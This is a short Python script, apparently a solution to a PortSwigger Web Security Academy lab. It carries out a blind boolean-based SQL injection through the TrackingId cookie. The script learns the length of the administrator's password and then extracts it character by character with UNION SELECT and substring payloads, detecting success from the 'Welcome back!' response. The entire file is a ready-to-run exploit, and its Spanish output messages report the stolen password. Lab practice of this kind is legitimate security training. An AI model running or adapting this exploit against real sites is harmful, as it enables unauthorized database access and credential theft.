import requests, re, signal, sys

def  extract_password(URL,length_password,PASSWORD,CHARACTERS,PATTEN):
    for i in range(1,length_password+1):
        for st in CHARACTERS:
            payload = "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,{},1)='{}'--".format(str(i),st)
            cookies_payload = {"TrackingId": payload}
            response = requests.get(URL, cookies=cookies_payload)
            if re.search(PATTEN, response.text):
                PASSWORD += st
            else:
                pass
    return PASSWORD

def verify_length_password(URL,PATTEN):
    
    for num in range(1,100):
        payload = "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>{}--".format(num)
        cookies_payload = {"TrackingId": payload}
        response = requests.get(URL, cookies=cookies_payload)
        if re.search(PATTEN, response.text) :
            length_password = num
        else:
            return length_password+1

def def_handler(key,frame):
    print("\n[*] Saliendo")
    sys.exit(1)

def main():
    URL = "https://acdb1ff01e63416280c41a4c008d0004.web-security-academy.net/filter?category=Gifts"
    CHARACTERS = "0123456789abcdefghijklmnopqrstuvwxyz"
    PASSWORD = ""
    PATTEN = "Welcome back!"

    signal.signal(signal.SIGINT, def_handler)

    length_password = verify_length_password(URL,PATTEN)
    print("El password tiene de longitud: {}".format(length_password))
    
    password = extract_password(URL,length_password,PASSWORD,CHARACTERS,PATTEN)
    print("El password es: {}".format(password))

if __name__ == "__main__":
    main()